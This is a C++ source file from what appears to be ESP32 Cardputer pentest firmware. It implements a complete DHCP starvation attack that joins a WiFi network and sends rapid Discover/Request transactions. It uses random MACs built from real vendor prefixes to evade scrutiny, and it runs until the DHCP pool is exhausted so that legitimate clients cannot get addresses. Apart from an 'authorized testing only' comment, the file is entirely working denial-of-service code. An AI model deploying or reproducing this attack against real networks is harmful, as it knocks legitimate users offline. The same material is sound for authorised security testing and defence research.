/*
 * SaltyJack — DHCP Starvation.
 *
 * Direct port of @7h30th3r0n3's `startDHCPStarvation()` from Evil-Cardputer
 * (Evil-M5Project). https://github.com/7h30th3r0n3/Evil-M5Project
 *
 * How it works:
 *   1. We must already be associated with the target WiFi network (STA
 *      mode, got a DHCP lease of our own — that's how we know the pool).
 *   2. Send a single broadcast DHCP Discover to identify the real DHCP
 *      server (we learn its IP from the Offer's siaddr/server-id).
 *   3. Loop: generate a random client MAC (plausible OUI + random suffix),
 *      run a full Discover → Offer → Request → ACK transaction with it.
 *      Each successful ACK consumes one IP from the pool.
 *   4. When the server starts NAK'ing, the pool is exhausted — new
 *      legitimate clients on the network can't get a lease.
 *
 * Counter UI shows Discover / Offer / Request / ACK / NAK live. ESC stops.
 *
 * AUTHORIZED TESTING ONLY. This will break a network's DHCP service.
 */
#include "../../app.h"
#include "../../ui.h"
#include "../../input.h"
#include "../../radio.h"
#include "../../sfx.h"
#include "saltyjack.h"
#include "saltyjack_style.h"
#include <WiFi.h>
#include <WiFiUdp.h>
#include <esp_random.h>
#include <esp_netif.h>

/* ---- shared state for the feature ---- */
static WiFiUDP s_udp;
static uint32_t s_discover = 0, s_offer = 0, s_request = 0, s_ack = 0, s_nak = 0;
static IPAddress s_dhcp_server;
static IPAddress s_last_ip;
static const char *s_hostname    = "Evil-Client";
static const char *s_vendor_class = "MSFT 5.0";

/* Known-OUI table — picking from real vendor prefixes makes our fake MACs
 * less obviously bogus than fully random ones. Directly lifted from the
 * Evil-Cardputer source. */
static const uint8_t KNOWN_OUI[][3] = {
    {0x00,0x1A,0x2B}, {0x00,0x1B,0x63}, {0x00,0x1C,0x4D}, {0xAC,0xDE,0x48},
    {0xD8,0x3C,0x69}, {0x3C,0xA0,0x67}, {0xB4,0x86,0x55}, {0xF4,0x28,0x53},
    {0x00,0x25,0x9C}, {0x00,0x16,0xEA}, {0x00,0x1E,0xC2}, {0x50,0xCC,0xF8},
    {0x00,0x24,0xE8}, {0x88,0x32,0x9B}, {0x00,0x26,0xBB}, {0x78,0xD7,0xF7},
    {0xBC,0x92,0x6B}, {0x84,0xA8,0xE4}, {0xD4,0x25,0x8B}, {0x8C,0x5A,0xF0},
    {0xAC,0x3C,0x0B}, {0x00,0x17,0xF2}, {0x00,0x1D,0x7E}, {0xF8,0x16,0x54},
    {0xE8,0x94,0xF6}, {0xF4,0x09,0xD8}, {0x00,0x0F,0xB5}, {0x40,0x16,0x7E},
    {0x68,0x5B,0x35}, {0xF4,0x6D,0x04}, {0x00,0x1E,0x3D}, {0x24,0xD4,0x42},
    {0x4C,0x32,0x75}, {0x74,0x83,0xEF}, {0x28,0xA1,0x83}, {0xB8,0x27,0xEB},
    {0x44,0x65,0x0D}, {0x38,0xFF,0x36}, {0x00,0x23,0x6C}
};
#define KNOWN_OUI_N (sizeof(KNOWN_OUI) / sizeof(KNOWN_OUI[0]))

static void random_mac(uint8_t out[6])
{
    const uint8_t *oui = KNOWN_OUI[esp_random() % KNOWN_OUI_N];
    out[0] = oui[0]; out[1] = oui[1]; out[2] = oui[2];
    out[3] = (uint8_t)(esp_random() & 0xFF);
    out[4] = (uint8_t)(esp_random() & 0xFF);
    out[5] = (uint8_t)(esp_random() & 0xFF);
}

/*
 * Build a DHCP packet. `msg_type` is DHCP Discover (1) or Request (3).
 * For Request: `requested` + `server` must be valid.
 * Returns bytes written.
 */
static int build_dhcp(uint8_t *buf, uint8_t msg_type, const uint8_t mac[6],
                      IPAddress requested, IPAddress server)
{
    memset(buf, 0, 300);
    int i = 0;
    buf[i++] = 0x01;  /* OP BOOTREQUEST */
    buf[i++] = 0x01;  /* HTYPE Ethernet */
    buf[i++] = 0x06;  /* HLEN */
    buf[i++] = 0x00;  /* HOPS */

    /* XID */
    uint32_t xid = esp_random();
    buf[i++] = (xid >> 24) & 0xFF;
    buf[i++] = (xid >> 16) & 0xFF;
    buf[i++] = (xid >> 8)  & 0xFF;
    buf[i++] = xid & 0xFF;

    /* SECS(2) + FLAGS(2 — broadcast bit set) */
    buf[i++] = 0x00; buf[i++] = 0x00;
    buf[i++] = 0x80; buf[i++] = 0x00;

    /* ciaddr(4) yiaddr(4) siaddr(4) giaddr(4) = 0 */
    i += 16;

    /* chaddr: client MAC padded to 16 bytes */
    memcpy(buf + i, mac, 6); i += 6;
    i += 10;

    /* sname(64) + file(128) = 192 zeros — already 0 from memset */
    i += 192;

    /* Magic cookie */
    buf[i++] = 0x63; buf[i++] = 0x82; buf[i++] = 0x53; buf[i++] = 0x63;

    /* Option 53 — DHCP message type */
    buf[i++] = 53; buf[i++] = 1; buf[i++] = msg_type;

    if (msg_type == 3) {  /* Request */
        /* Option 50 — Requested IP */
        buf[i++] = 50; buf[i++] = 4;
        buf[i++] = requested[0]; buf[i++] = requested[1];
        buf[i++] = requested[2]; buf[i++] = requested[3];
        /* Option 54 — Server Identifier */
        buf[i++] = 54; buf[i++] = 4;
        buf[i++] = server[0]; buf[i++] = server[1];
        buf[i++] = server[2]; buf[i++] = server[3];
    }

    /* Option 61 — Client Identifier (hw type + MAC) */
    buf[i++] = 61; buf[i++] = 7; buf[i++] = 0x01;
    memcpy(buf + i, mac, 6); i += 6;

    /* Option 60 — Vendor Class */
    size_t vlen = strlen(s_vendor_class);
    buf[i++] = 60; buf[i++] = (uint8_t)vlen;
    memcpy(buf + i, s_vendor_class, vlen); i += vlen;

    /* Option 12 — Host Name */
    size_t hlen = strlen(s_hostname);
    buf[i++] = 12; buf[i++] = (uint8_t)hlen;
    memcpy(buf + i, s_hostname, hlen); i += hlen;

    /* Option 55 — Parameter Request List */
    buf[i++] = 55; buf[i++] = 4;
    buf[i++] = 1;  /* Subnet Mask */
    buf[i++] = 3;  /* Router */
    buf[i++] = 6;  /* DNS */
    buf[i++] = 15; /* Domain Name */

    /* End */
    buf[i++] = 255;
    return i;
}

/* Parse DHCP message type (option 53) from a received packet. */
static uint8_t parse_dhcp_type(const uint8_t *buf, int len)
{
    if (len < 240) return 0;
    int i = 240;  /* skip fixed header + magic cookie */
    while (i < len) {
        uint8_t opt = buf[i++];
        if (opt == 0) continue;
        if (opt == 255) break;
        if (i >= len) break;
        uint8_t olen = buf[i++];
        if (opt == 53 && olen == 1 && i < len) return buf[i];
        i += olen;
    }
    return 0;
}

/* Pull yiaddr from a DHCP response. Offset 16..19. */
static IPAddress parse_yiaddr(const uint8_t *buf, int len)
{
    if (len < 24) return IPAddress(0, 0, 0, 0);
    return IPAddress(buf[16], buf[17], buf[18], buf[19]);
}

/* Send one Discover, wait briefly for Offer. If Offer comes, send Request.
 * Returns true on a full ACK'd transaction. */
static bool run_transaction(const uint8_t mac[6])
{
    uint8_t pkt[300];
    IPAddress broadcast(255, 255, 255, 255);

    /* Discover */
    int n = build_dhcp(pkt, 1, mac, IPAddress(0,0,0,0), IPAddress(0,0,0,0));
    if (!s_udp.beginPacket(broadcast, 67)) return false;
    s_udp.write(pkt, n);
    s_udp.endPacket();
    s_discover++;

    /* Wait up to 2 seconds for Offer */
    uint32_t t0 = millis();
    IPAddress offered_ip;
    IPAddress server_ip;
    bool got_offer = false;
    while (millis() - t0 < 2000) {
        int ps = s_udp.parsePacket();
        if (ps <= 0) { delay(5); continue; }
        uint8_t rx[600];
        int rl = s_udp.read(rx, ps > (int)sizeof(rx) ? sizeof(rx) : ps);
        uint8_t t = parse_dhcp_type(rx, rl);
        if (t == 2) {  /* Offer */
            offered_ip = parse_yiaddr(rx, rl);
            /* siaddr — next-server-IP (offset 20..23). Fallback to our
             * stored server if 0. */
            server_ip = IPAddress(rx[20], rx[21], rx[22], rx[23]);
            if (server_ip == IPAddress(0,0,0,0)) server_ip = s_dhcp_server;
            s_offer++;
            got_offer = true;
            break;
        }
    }
    if (!got_offer) return false;

    /* Request */
    n = build_dhcp(pkt, 3, mac, offered_ip, server_ip);
    if (!s_udp.beginPacket(broadcast, 67)) return false;
    s_udp.write(pkt, n);
    s_udp.endPacket();
    s_request++;

    /* Wait for ACK / NAK */
    t0 = millis();
    while (millis() - t0 < 2000) {
        int ps = s_udp.parsePacket();
        if (ps <= 0) { delay(5); continue; }
        uint8_t rx[600];
        int rl = s_udp.read(rx, ps > (int)sizeof(rx) ? sizeof(rx) : ps);
        uint8_t t = parse_dhcp_type(rx, rl);
        if (t == 5) { s_ack++; s_last_ip = parse_yiaddr(rx, rl); return true; }
        if (t == 6) { s_nak++; return false; }
    }
    return false;
}

/* ---- UI ---- */

void feat_saltyjack_dhcp_starve(void)
{
    radio_switch(RADIO_WIFI);
    auto &d = M5Cardputer.Display;

    if (WiFi.status() != WL_CONNECTED || WiFi.localIP() == IPAddress(0,0,0,0)) {
        sj_frame("DHCP STARVE");
        d.setTextColor(SJ_BAD, SJ_BG);
        d.setCursor(SJ_CONTENT_X, BODY_Y + 24); d.print("Not connected.");
        d.setTextColor(SJ_FG, SJ_BG);
        d.setCursor(SJ_CONTENT_X, BODY_Y + 38); d.print("Join target WiFi first");
        d.setCursor(SJ_CONTENT_X, BODY_Y + 48); d.print("via System > Connect.");
        sj_footer("`=back");
        while (input_poll() == PK_NONE) delay(30);
        return;
    }

    s_discover = s_offer = s_request = s_ack = s_nak = 0;
    s_dhcp_server = WiFi.gatewayIP();
    s_last_ip = IPAddress(0, 0, 0, 0);

    /* The ESP-IDF internal DHCP client owns port 68 on the STA interface and
     * will eat our inbound Offers. Stop it for the duration of the attack;
     * we already have a lease so we can run without it. */
    esp_netif_t *sta_netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    if (sta_netif) esp_netif_dhcpc_stop(sta_netif);
    delay(50);

    if (!s_udp.begin(68)) {
        if (sta_netif) esp_netif_dhcpc_start(sta_netif);
        ui_toast("UDP bind failed", 0xFB4A, 1500);
        return;
    }

    sfx_deauth_burst();

    sj_frame("DHCP STARVE");
    uint32_t last_draw = 0;
    while (true) {
        uint8_t mac[6];
        random_mac(mac);
        run_transaction(mac);

        if (millis() - last_draw > 250) {
            last_draw = millis();
            sj_frame("DHCP STARVE");

            d.setTextColor(SJ_FG_DIM, SJ_BG);
            d.setCursor(SJ_CONTENT_X, SJ_CONTENT_Y);
            d.print("srv ");
            d.setTextColor(SJ_ACCENT, SJ_BG);
            d.print(s_dhcp_server.toString().c_str());

            sj_row             (SJ_CONTENT_Y + 11, "discover", s_discover);
            sj_row             (SJ_CONTENT_Y + 20, "offer   ", s_offer);
            sj_row             (SJ_CONTENT_Y + 29, "request ", s_request);
            sj_row_highlight   (SJ_CONTENT_Y + 38, "ACK     ", s_ack);
            sj_row_colored     (SJ_CONTENT_Y + 49, "NAK     ", s_nak, SJ_BAD);

            d.setTextColor(SJ_FG_DIM, SJ_BG);
            d.setCursor(SJ_CONTENT_X, SJ_CONTENT_Y + 60);
            d.printf("last IP: %s", s_last_ip.toString().c_str());

            if (s_nak >= 20) {
                sj_print_warn(SJ_CONTENT_Y + 72, "pool exhausted");
            } else {
                sj_print_ok(SJ_CONTENT_Y + 72, "flooding...");
            }

            sj_footer(s_nak >= 20 ? "STARVED  `=stop" : "`=stop");
        }

        uint16_t k = input_poll();
        if (k == PK_ESC) break;
    }

    s_udp.stop();
    /* Restart the real DHCP client so the next app on this WiFi still renews. */
    if (sta_netif) esp_netif_dhcpc_start(sta_netif);

    sj_frame("STARVE STOPPED");
    sj_row        (BODY_Y + 20, "discover", s_discover);
    sj_row        (BODY_Y + 30, "offer   ", s_offer);
    sj_row        (BODY_Y + 40, "request ", s_request);
    sj_row_colored(BODY_Y + 50, "ACK     ", s_ack, SJ_GOOD);
    sj_row_colored(BODY_Y + 60, "NAK     ", s_nak, SJ_BAD);
    sj_footer("any key");
    while (input_poll() == PK_NONE) delay(30);
}
